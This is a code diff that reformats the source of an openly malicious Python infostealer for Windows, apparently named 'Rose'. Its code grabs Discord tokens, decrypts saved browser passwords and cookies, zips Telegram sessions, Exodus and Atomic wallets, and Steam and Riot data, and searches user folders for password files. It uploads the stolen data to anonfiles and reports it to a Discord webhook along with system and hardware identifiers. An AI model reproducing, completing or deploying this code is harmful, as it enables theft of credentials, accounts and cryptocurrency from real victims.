@@ -57,9 +57,10 @@ except Exception:
         "browser_cookie3",
     ]
     # the [0:-3] removes the leading " &&"
-    command = " ".join(
-        [f"python -m pip install {requirement} &&" for requirement in requirements]
-    )[0:-3]
+    command = " ".join([
+        f"python -m pip install {requirement} &&"
+        for requirement in requirements
+    ])[0:-3]
     subprocess.run(command, shell=True)
 
 if platform.system() != "Windows":
@@ -89,9 +90,9 @@ startup_loc = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 Threadlist = []
 DETECTED = False
 
-
 payload1 = {
-    "content": "<:pikachusign:1084901293669220422> **AYOOO GRABBED SOME DUMMY** ||@everyone||",
+    "content":
+    "<:pikachusign:1084901293669220422> **AYOOO GRABBED SOME DUMMY** ||@everyone||",
     "username": wh_name,
     "avatar_url": wh_avatar,
 }
@@ -130,9 +131,9 @@ def CryptUnprotectData(encrypted_bytes, entropy=b""):
     blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
     blob_out = DATA_BLOB()
 
-    if windll.crypt32.CryptUnprotectData(
-        byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)
-    ):
+    if windll.crypt32.CryptUnprotectData(byref(blob_in), None,
+                                         byref(blob_entropy), None, None, 0x01,
+                                         byref(blob_out)):
         return GetData(blob_out)
 
 
@@ -188,27 +189,33 @@ dclass = discordc.DiscordX()
 
 def upload(name, link):
     headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+        "Content-Type":
+        "application/json",
+        "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
     }
 
     if name == "kiwi":
         data = {
-            "content": "",
-            "embeds": [
-                {
-                    "color": 3449140,
-                    "fields": [
-                        {"name": "Interesting files found on user PC:", "value": link}
-                    ],
-                    "author": {"name": "Rose | File stealer"},
-                    "footer": {
-                        "text": eb_footer,
-                        "icon_url": "",
-                    },
-                }
-            ],
-            "avatar_url": wh_avatar,
+            "content":
+            "",
+            "embeds": [{
+                "color":
+                3449140,
+                "fields": [{
+                    "name": "Interesting files found on user PC:",
+                    "value": link
+                }],
+                "author": {
+                    "name": "Rose | File stealer"
+                },
+                "footer": {
+                    "text": eb_footer,
+                    "icon_url": "",
+                },
+            }],
+            "avatar_url":
+            wh_avatar,
             "attachments": [],
         }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
@@ -220,20 +227,22 @@ def upload(name, link):
             rrrrr = Reformat(str(cookiWords))
             rb = "  -  ".join(da for da in rrrrr)
         data = {
-            "content": "",
-            "embeds": [
-                {
-                    "title": f"{wh_name}  -  Cookie Grabber",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n**{CookiCount}** Cookies Found\n[RoseCookies.txt]({link})",
-                    "color": eb_color,
-                    "footer": {
-                        "text": eb_footer,
-                        "icon_url": "",
-                    },
-                }
-            ],
-            "username": wh_name,
-            "avatar_url": wh_avatar,
+            "content":
+            "",
+            "embeds": [{
+                "title": f"{wh_name}  -  Cookie Grabber",
+                "description":
+                f"**Found**:\n{rb}\n\n**Data:**\n**{CookiCount}** Cookies Found\n[RoseCookies.txt]({link})",
+                "color": eb_color,
+                "footer": {
+                    "text": eb_footer,
+                    "icon_url": "",
+                },
+            }],
+            "username":
+            wh_name,
+            "avatar_url":
+            wh_avatar,
             "attachments": [],
         }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
@@ -246,20 +255,22 @@ def upload(name, link):
             ra = "  -  ".join(da for da in rrr)
 
         data = {
-            "content": "",
-            "embeds": [
-                {
-                    "title": f"{wh_name}  -  Password Grabber",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n**{PasswCount}** Passwords Found\n[RosePasswords.txt]({link})",
-                    "color": eb_color,
-                    "footer": {
-                        "text": eb_footer,
-                        "icon_url": "",
-                    },
-                }
-            ],
-            "username": wh_name,
-            "avatar_url": wh_avatar,
+            "content":
+            "",
+            "embeds": [{
+                "title": f"{wh_name}  -  Password Grabber",
+                "description":
+                f"**Found**:\n{ra}\n\n**Data:**\n**{PasswCount}** Passwords Found\n[RosePasswords.txt]({link})",
+                "color": eb_color,
+                "footer": {
+                    "text": eb_footer,
+                    "icon_url": "",
+                },
+            }],
+            "username":
+            wh_name,
+            "avatar_url":
+            wh_avatar,
             "attachments": [],
         }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
@@ -278,13 +289,13 @@ def GetTokens(path, arg):
     for file in os.listdir(path):
         if file.endswith(".log") or file.endswith(".ldb"):
             for line in [
-                x.strip()
-                for x in open(f"{path}\\{file}", errors="ignore").readlines()
-                if x.strip()
+                    x.strip() for x in open(f"{path}\\{file}",
+                                            errors="ignore").readlines()
+                    if x.strip()
             ]:
                 for regex in (
-                    r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
-                    r"mfa\.[\w-]{80,95}",
+                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
+                        r"mfa\.[\w-]{80,95}",
                 ):
                     for token in re.findall(regex, line):
                         global Tokens
@@ -306,16 +317,15 @@ def GetPasswords(path, arg):
         return
 
     tempfold = (
-        temp
-        + "wp"
-        + "".join(random.choice("bcdefghijklmnopqrstuvwxyz") for i in range(8))
-        + ".db"
-    )
+        temp + "wp" +
+        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
+                for i in range(8)) + ".db")
 
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
     cursor = conn.cursor()
-    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
+    cursor.execute(
+        "SELECT action_url, username_value, password_value FROM logins;")
     data = cursor.fetchall()
     cursor.close()
     conn.close()
@@ -360,16 +370,17 @@ def GetDiscord(path, arg):
         # print(path, file)
         if file.endswith(".log") or file.endswith(".ldb"):
             for line in [
-                x.strip()
-                for x in open(f"{pathC}\\{file}", errors="ignore").readlines()
-                if x.strip()
+                    x.strip() for x in open(f"{pathC}\\{file}",
+                                            errors="ignore").readlines()
+                    if x.strip()
             ]:
-                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                for token in re.findall(
+                        r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                     global Tokens
                     tokenDecoded = DecryptValue(
-                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key
-                    )
-                    if dclass.checkToken(tokenDecoded) and tokenDecoded not in Tokens:
+                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
+                    if dclass.checkToken(
+                            tokenDecoded) and tokenDecoded not in Tokens:
                         # print(token)
                         Tokens += tokenDecoded
                         # writeforfile(Tokens, 'tokens')
@@ -386,12 +397,8 @@ def ZipTelegram(path, arg, procc):
 
     zf = ZipFile(f"{pathC}/{name}.zip", "w")
     for file in os.listdir(pathC):
-        if (
-            ".zip" not in file
-            and "tdummy" not in file
-            and "user_data" not in file
-            and "webview" not in file
-        ):
+        if (".zip" not in file and "tdummy" not in file
+                and "user_data" not in file and "webview" not in file):
             zf.write(pathC + "/" + file)
     zf.close()
 
@@ -415,11 +422,9 @@ def GetCookies(path, arg):
         return
 
     tempfold = (
-        temp
-        + "wp"
-        + "".join(random.choice("bcdefghijklmnopqrstuvwxyz") for i in range(8))
-        + ".db"
-    )
+        temp + "wp" +
+        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
+                for i in range(8)) + ".db")
 
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
@@ -584,7 +589,10 @@ def GatherAll():
     ]
 
     PathsToZip = [
-        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
+        [
+            f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"',
+            "Wallet"
+        ],
         [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
         ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
         [
@@ -598,7 +606,9 @@ def GatherAll():
             "RiotClient",
         ],
     ]
-    Telegram = [f"{roaming}/Telegram Desktop/tdata", "telegram.exe", "Telegram"]
+    Telegram = [
+        f"{roaming}/Telegram Desktop/tdata", "telegram.exe", "Telegram"
+    ]
 
     if cc.get_token_stealing() is True:
         for patt in browserPaths:
@@ -618,10 +628,12 @@ def GatherAll():
             Threadlist.append(a)
 
         for patt in browserPaths:
-            threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
+            threading.Thread(target=ZipThings,
+                             args=[patt[0], patt[5], patt[1]]).start()
 
         for patt in PathsToZip:
-            threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
+            threading.Thread(target=ZipThings,
+                             args=[patt[0], patt[2], patt[1]]).start()
 
     if cc.get_cookie_stealing() is True:
         for patt in browserPaths:
@@ -641,7 +653,8 @@ def GatherAll():
     upths = []
 
     if cc.get_password_stealing() is True:
-        upload("wppassw", uploadToAnonfiles(os.getenv("TEMP") + "\\wppassw.txt"))
+        upload("wppassw",
+               uploadToAnonfiles(os.getenv("TEMP") + "\\wppassw.txt"))
 
     if cc.get_cookie_stealing() is True:
         upload("wpcook", uploadToAnonfiles(os.getenv("TEMP") + "\\wpcook.txt"))
@@ -676,9 +689,10 @@ def KiwiFile(path, keywords):
         for worf in keywords:
             if worf in file.lower():
                 if os.path.isfile(path + "/" + file) and ".txt" in file:
-                    fifound.append(
-                        [path + "/" + file, uploadToAnonfiles(path + "/" + file)]
-                    )
+                    fifound.append([
+                        path + "/" + file,
+                        uploadToAnonfiles(path + "/" + file)
+                    ])
                     break
                 if os.path.isdir(path + "/" + file):
                     target = path + "/" + file
@@ -690,7 +704,9 @@ def KiwiFile(path, keywords):
 
 def Kiwi():
     user = temp.split("\AppData")[0]
-    path2search = [user + "\\Desktop", user + "\\Downloads", user + "\\Documents"]
+    path2search = [
+        user + "\\Desktop", user + "\\Downloads", user + "\\Documents"
+    ]
 
     key_wordsFiles = [
         "passw",
@@ -787,30 +803,29 @@ GatherAll()
 def send_malicious():
     username = getpass.getuser()
     hostname = socket.gethostname()
-    hwid = (
-        str(subprocess.check_output("wmic csproduct get uuid"), "utf-8")
-        .split("\n")[1]
-        .strip()
-    )
-    name = (
-        str(subprocess.check_output("wmic csproduct get name"), "utf-8")
-        .split("\n")[1]
-        .strip()
-    )
+    hwid = (str(subprocess.check_output("wmic csproduct get uuid"),
+                "utf-8").split("\n")[1].strip())
+    name = (str(subprocess.check_output("wmic csproduct get name"),
+                "utf-8").split("\n")[1].strip())
 
     embed = {
-        "title": f"{name}  -  System Data",
-        "description": "System Information.",
-        "color": eb_color,
+        "title":
+        f"{name}  -  System Data",
+        "description":
+        "System Information.",
+        "color":
+        eb_color,
         "fields": [
             {
                 "name": "User",
-                "value": f"```Host Name: {hostname}\n\nUsername: {username}```",
+                "value":
+                f"```Host Name: {hostname}\n\nUsername: {username}```",
                 "inline": True,
             },
             {
                 "name": "System",
-                "value": f"```OS: {platform.platform()}\n\nProcessor: {platform.processor()}\n\nHWID: {hwid}```",
+                "value":
+                f"```OS: {platform.platform()}\n\nProcessor: {platform.processor()}\n\nHWID: {hwid}```",
                 "inline": True,
             },
         ],
